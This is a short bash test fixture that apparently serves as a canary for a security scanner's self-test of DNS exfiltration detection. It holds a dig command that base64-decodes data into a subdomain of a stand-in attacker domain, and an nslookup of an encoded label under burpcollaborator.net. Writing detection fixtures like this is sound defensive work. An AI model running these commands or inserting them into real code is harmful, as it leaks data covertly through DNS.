#!/bin/bash
# CANARY: DNS exfiltration pattern
# This file is used by AISLE Scanner E selfTest() to verify detection.
# DO NOT EXECUTE — this is a test fixture only.
dig $(echo "c2VjcmV0LWRhdGEtZXhmaWx0cmF0aW9uLXRlc3Q=" | base64 -d).evil.sfrclak.com
nslookup AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD.burpcollaborator.net
